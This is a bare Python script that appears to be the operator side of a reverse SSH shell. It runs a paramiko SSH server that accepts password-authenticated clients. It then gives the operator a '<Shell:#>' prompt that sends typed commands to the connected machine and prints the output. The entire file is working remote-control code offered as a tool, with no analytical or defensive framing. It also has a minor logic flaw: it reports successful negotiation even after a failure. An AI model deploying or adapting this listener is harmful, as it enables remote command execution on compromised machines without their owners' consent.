import socket
import paramiko
import threading
import sys

#script args
server_address = "0.0.0.0"
clients_port = int(sys.argv[1])
clients_password = sys.argv[2]
server_host_key = paramiko.RSAKey(filename="./ssh_server.key")

connected_clients = []

#ssh server parameters defined in the class
class ClientServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        self.username = ""
    def check_auth_password(self, username, password):
        if password == clients_password:
            self.username = username
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

#ssh client handler
def client_handler():
    _, client_ssh_session, client_ssh_channel = connected_clients[0]
    while not client_ssh_channel.closed:
        command = input("<Shell:#> ").rstrip()
        if len(command):
            if command != "exit":
                client_ssh_channel.send(command)
                print(client_ssh_channel.recv(1024).decode('utf-8') + '\n')
            else:
                print("[*] Exiting")
                try:
                    client_ssh_session.close()
                except:
                    print("[!] Error closing SSH session")
                print("[*] SSH session closed")

clients_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clients_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#ssh server bind and listen
try:
    clients_socket.bind((server_address, clients_port))
except:
    print(f"[!] Bind Error for SSH Server using {server_address}:{clients_socket.getsockname()[1]}")
    sys.exit(1)
print(f"[*] Bind Success for SSH Server using {server_address}:{clients_socket.getsockname()[1]}")
clients_socket.listen(100)
print("[*] Listening")

#Keep ssh server active and accept incoming tcp connections
while True:
    client_socket, addr = clients_socket.accept()
    print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
    try:
        client_ssh_session = paramiko.Transport(client_socket)
        client_ssh_session.add_server_key(server_host_key)
        client_server = ClientServer()
        #start the ssh server and negotiate ssh params
        try:
            client_ssh_session.start_server(server=client_server)
        except paramiko.SSHException as err:
            print("[!] SSH Parameters Negotiation Failed")
        print("[*] SSH Parameters Negotiation Succeeded")
        #authenticate the client
        print("[*] Authenticating")
        client_ssh_channel = client_ssh_session.accept(20)
        if client_ssh_channel == None or not client_ssh_channel.active:
            print("[*] SSH Client Authentication Failure")
            client_ssh_session.close()
        else:
            print(f"[*] SSH Client Authenticated with username: {client_server.username}")
            connected_clients.append((client_server.username, client_ssh_session, client_ssh_channel))
            client_handler()
    except Exception as err:
        print("[*] Caught Exception: ", str(err))
        print("[*] Exiting Script")
        try:
            client_ssh_session.close()
        except:
            print("[!] Error closing SSH session")
        print("[*] SSH session closed")
        sys.exit(1)